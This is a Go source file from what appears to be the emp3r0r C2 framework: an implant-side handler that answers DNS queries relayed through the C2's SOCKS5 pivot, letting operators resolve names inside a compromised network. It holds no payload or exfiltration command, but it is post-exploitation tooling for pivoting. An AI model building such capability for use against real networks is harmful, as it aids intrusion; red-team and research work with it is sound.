package handler

// cmd_dns.go — agent-side resolver for the C2 DNS helper (!dns_query).
//
// The CC-internal SOCKS5 pivot relays TCP byte streams; UDP (DNS) traffic
// cannot be carried that way. Instead the C2's UDP-ASSOCIATE handler (see
// cc/server/socks5_udp.go) forwards each DNS query to the bound agent with
// !dns_query (raw packet, base64 in --query) and this handler answers with a
// complete DNS response packet (raw bytes on the message tunnel).
//
// The agent is the right place to do the actual resolution: it is the only
// party that can reach agent-side / internal DNS servers, it honours the
// configured DoH/transport proxies, and — being a stub resolver — it simply
// asks the OS (or the DoH server) the same way it resolves any name it needs.
// Only A/AAAA questions are answered (that is all libc / the TUN stack's DNS
// hijack path needs); other record types get an empty NOERROR answer section,
// exactly like a stub resolver that forwards only A/AAAA.
//
// All input is hostile (it originates from operator-side traffic): every
// length and index derived from the query packet is bounds-checked before
// use, and a single in-flight resolution is enforced so a broken client can
// not spawn an unbounded number of concurrent lookups on the agent.

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync/atomic"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

const (
	// dnsQueryTimeout bounds the agent-side resolution of one DNS question.
	dnsQueryTimeout = 10 * time.Second
	// dnsMaxQueryBytes bounds a DNS query packet we are willing to parse.
	dnsMaxQueryBytes = 4096
	// dnsMaxAnswerCount bounds how many addresses we pack into one response.
	dnsMaxAnswerCount = 16

	dnsTypeA    = 1
	dnsTypeAAAA = 28

	dnsHeaderSize = 12
)

// dnsInFlight guards against re-entrant / concurrent answer races.
var dnsInFlight atomic.Int32

func dnsQueryCmdRun(cmd *cobra.Command, _ []string) {
	token, _ := cmd.Flags().GetString("token")
	queryB64, _ := cmd.Flags().GetString("query")
	if token == "" || queryB64 == "" {
		c2transport.NotifyC2(cmd, "Error: !dns_query requires --token and --query")
		return
	}
	raw, err := base64.StdEncoding.DecodeString(queryB64)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: invalid base64 query: %v", err)
		return
	}
	if len(raw) <= dnsHeaderSize || len(raw) > dnsMaxQueryBytes {
		c2transport.NotifyC2(cmd, "Error: invalid DNS query length %d", len(raw))
		return
	}

	// Parse the question so we can resolve the name and echo the same
	// ID/question in the reply (required by every DNS client for matching).
	qid, qname, qtype, qstart, qend, ok := parseDNSQuestion(raw)
	if !ok {
		c2transport.NotifyC2(cmd, "Error: malformed DNS query (%d bytes)", len(raw))
		return
	}

	// Cap concurrent resolutions: hostile or broken operator-side traffic must
	// not let the agent spawn an unbounded number of lookups.
	if !dnsInFlight.CompareAndSwap(0, 1) {
		c2transport.NotifyC2(cmd, "Error: another DNS resolution is in progress")
		return
	}
	defer dnsInFlight.Store(0)

	answers, err := resolveDNSName(qname, qtype)
	if err != nil {
		logging.Debugf("dns_query %s (%s): %v", qname, dnsTypeName(qtype), err)
		c2transport.NotifyC2Binary(cmd, buildDNSReply(raw, qid, qstart, qend, qtype, answers, dnsRcodeForErr(err)))
		return
	}
	resp := buildDNSReply(raw, qid, qstart, qend, qtype, answers, dnsRcodeNoError)
	c2transport.NotifyC2Binary(cmd, resp)
	logging.Debugf("dns_query %s (%s) -> %d answer(s)", qname, dnsTypeName(qtype), len(answers))
}

// parseDNSQuestion extracts the ID, lowercased QNAME, QTYPE and the byte span
// of the question section (name + QTYPE/QCLASS) from a raw DNS query. Every
// offset is bounds-checked; the function returns ok=false on any malformed or
// oversized input. Compression pointers are rejected: a stub-generated query
// must carry the full question name.
func parseDNSQuestion(raw []byte) (qid uint16, qname string, qtype uint16, qstart, qend int, ok bool) {
	if len(raw) < dnsHeaderSize+5 { // header + at least root label + QTYPE/QCLASS
		return 0, "", 0, 0, 0, false
	}
	qid = binary.BigEndian.Uint16(raw[0:2])
	qstart = dnsHeaderSize

	var sb strings.Builder
	pos := dnsHeaderSize
	for {
		if pos >= len(raw) {
			return 0, "", 0, 0, 0, false
		}
		l := int(raw[pos])
		switch {
		case l == 0: // end of name
			pos++
		case l <= 63: // label
			if pos+1+l > len(raw) {
				return 0, "", 0, 0, 0, false
			}
			if sb.Len() > 0 {
				sb.WriteByte('.')
			}
			sb.Write(raw[pos+1 : pos+1+l])
			pos += 1 + l
		default: // compression pointer or extended label — not valid in a query question
			return 0, "", 0, 0, 0, false
		}
		if l == 0 {
			break
		}
	}
	// QTYPE + QCLASS
	if pos+4 > len(raw) {
		return 0, "", 0, 0, 0, false
	}
	qtype = binary.BigEndian.Uint16(raw[pos : pos+2])
	qend = pos + 4
	qname = strings.ToLower(sb.String())
	if qname == "" {
		// empty question name (root query); nothing to resolve
		return 0, "", 0, 0, 0, false
	}
	return qid, qname, qtype, qstart, qend, true
}

// resolveDNSName resolves qname for the requested record type using the OS
// resolver (which the agent may have replaced with a DoH resolver — see
// cmd/agent). Only the address types the TUN stack's DNS hijack consumes are
// supported; anything else is answered with no records (NOERROR), matching a
// stub resolver that forwards only A/AAAA.
func resolveDNSName(qname string, qtype uint16) ([]net.IP, error) {
	switch qtype {
	case dnsTypeA, dnsTypeAAAA:
	default:
		return nil, nil
	}

	network := "ip4"
	if qtype == dnsTypeAAAA {
		network = "ip6"
	}
	ctx, cancel := context.WithTimeout(context.Background(), dnsQueryTimeout)
	defer cancel()

	addrs, err := net.DefaultResolver.LookupIP(ctx, network, qname)
	if err != nil {
		return nil, err
	}
	out := make([]net.IP, 0, len(addrs))
	for _, ip := range addrs {
		if ip == nil {
			continue
		}
		if v4 := ip.To4(); v4 != nil {
			ip = v4
		}
		out = append(out, ip)
		if len(out) >= dnsMaxAnswerCount {
			break
		}
	}
	return out, nil
}

const (
	dnsRcodeNoError  = 0
	dnsRcodeServFail = 2
	dnsRcodeNXDomain = 3
)

// dnsRcodeForErr maps a resolver error to a DNS rcode. Not-found answers are
// NXDOMAIN so clients can tell "no such host" from "resolver broken".
func dnsRcodeForErr(err error) int {
	if err == nil {
		return dnsRcodeNoError
	}
	var dnserr *net.DNSError
	if errors.As(err, &dnserr) && dnserr.IsNotFound {
		return dnsRcodeNXDomain
	}
	return dnsRcodeServFail
}

// buildDNSReply builds a complete DNS response: it echoes the request's ID and
// question bytes verbatim (so the client can match it) and appends one answer
// RR per address. Non-address question types produce an empty NOERROR answer
// section.
func buildDNSReply(raw []byte, qid uint16, qstart, qend int, _ uint16, answers []net.IP, rcode int) []byte {
	// 12-byte header + question section copied verbatim from the query.
	resp := make([]byte, 0, dnsHeaderSize+(qend-qstart)+len(answers)*20)

	hdr := make([]byte, dnsHeaderSize)
	binary.BigEndian.PutUint16(hdr[0:2], qid)
	// flags: QR=1, RA=1, echo the client's RD, rcode in low nibble.
	reqFlags := binary.BigEndian.Uint16(raw[2:4])
	flags := uint16(0x8000 | 0x0080 | (reqFlags & 0x0100) | (uint16(rcode) & 0x000f))
	binary.BigEndian.PutUint16(hdr[2:4], flags)
	binary.BigEndian.PutUint16(hdr[4:6], 1) // QDCOUNT (we always have exactly one question)
	binary.BigEndian.PutUint16(hdr[6:8], uint16(len(answers)))
	binary.BigEndian.PutUint16(hdr[8:10], 0)  // NSCOUNT
	binary.BigEndian.PutUint16(hdr[10:12], 0) // ARCOUNT

	resp = append(resp, hdr...)
	resp = append(resp, raw[qstart:qend]...)

	// Answers. NAME is a compression pointer to the question name at offset 12.
	for _, ip := range answers {
		if ip == nil {
			continue
		}
		rr := make([]byte, 0, 16+len(ip))
		rr = append(rr, 0xc0, 0x0c) // pointer to byte 12 (question name)
		if v4 := ip.To4(); v4 != nil {
			rr = append(rr, 0x00, dnsTypeA, 0x00, 0x01) // TYPE A, CLASS IN
			rr = binary.BigEndian.AppendUint32(rr, 60)  // TTL
			rr = binary.BigEndian.AppendUint16(rr, 4)   // RDLENGTH
			rr = append(rr, v4...)
		} else if v6 := ip.To16(); v6 != nil {
			rr = append(rr, 0x00, dnsTypeAAAA, 0x00, 0x01)
			rr = binary.BigEndian.AppendUint32(rr, 60)
			rr = binary.BigEndian.AppendUint16(rr, 16)
			rr = append(rr, v6...)
		} else {
			continue
		}
		resp = append(resp, rr...)
	}
	return resp
}

func dnsTypeName(t uint16) string {
	switch t {
	case dnsTypeA:
		return "A"
	case dnsTypeAAAA:
		return "AAAA"
	default:
		return fmt.Sprintf("type-%d", t)
	}
}
